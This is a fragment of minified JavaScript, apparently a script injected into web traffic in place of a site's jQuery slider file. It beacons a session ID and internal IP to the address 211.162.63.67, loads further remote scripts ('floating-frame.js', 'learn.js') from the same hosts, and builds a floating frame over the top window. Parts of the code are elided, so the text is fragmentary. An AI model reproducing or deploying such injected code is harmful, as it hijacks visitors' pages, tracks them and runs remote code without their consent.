! function() {
    function sendAccounting(e, n) {
        ...
        n = n || 0;
        var t = new Image;
        11 == n || w && 6 == n || (t.src = "http://211.162.63.67:80/" + e + "-1/4189ee89-e758-4761-ae31-e75dd2899df1_10.130.44.71/" + n + "." + (m + j));
        (2 == e || g) && I.d();
        return t
    }

    function e(e) {
        return w ? "http://211.162.63.67:80/Check/2/1/4189ee89-e758-4761-ae31-e75dd2899df1/10.130.44.71/qur44n" : 1 == e && "http://211.162.63.67/CheckUrl/1/1"
    }
    ...
    function n(n) {
        var i, r, o = Math.floor(1e3 * j),
            ...
            u = c + o,
            s = {
                h: "4261e1179b723ae2eecf7a6c33e55c297daec541"
            },
            a = "_!$[]fp4189ee89-e758-4761-ae31-e75dd2899df1[]$!_";
        I = {
            d: function() {
                C[a] === s && (C[a] = 0)
            },
        ...
        if (n.json) {
            ...
            n.json._accounting = {
                ...
                allowNext: I,
                uri: "http://211.162.63.66/static",
                comm: "http://211.162.63.67/",
                fpsessionid: "4189ee89-e758-4761-ae31-e75dd2899df1",
                check: e("%TOPURLMATCH%"),
                direct: !1,
                prev: r
            }
        ...
        if (n.json2uri) {
            ...
            C[u] = n.json;
            for (i = 0; i < n.jsURI.length; i++) n.jsURI[i] += (n.jsURI[i].indexOf("?") !== -1 ? "&" : "?") + u
        }
    }
    ...
    function i() {
        ...
        f.jsURI = "http://211.162.63.66/static/FloatingContent/F0y7RdnhqmcHSfx8AqX9uQ/floating-frame.js";
        f.requireTopWindow = r("true", "RequireTopWindow");
        f.minHeight = u("1", "MinimumHeight");
        f.minWidth = u("1", "MinimumWidth");
        f.jsURI = i(c("http://211.162.63.67/static/Device/learn.js?FPSESSIONID=4189ee89-e758-4761-ae31-e75dd2899df1&COMMIP=211.162.63.67&OPERATORWEBSITELOGIC=OR&GROUPS=1"), "ContentURL");
        g = r("1", "AllowReplace");
    ...
    try {
        var l, f, h, p, m, d, I, g, R = "text/javascript",
            j = Math.random(),
            T = (new Date).getTime(),
            w = parseInt("qur44n", 36),
            E = parseFloat("45"),
            U = window,
            y = document,
            C = U,
            M = y;
        f = "http://" + unescape("www.szwcw.com%2Fupload%2Fjs%2Fslider.jquery.js%3Ft%3D1619701144497");
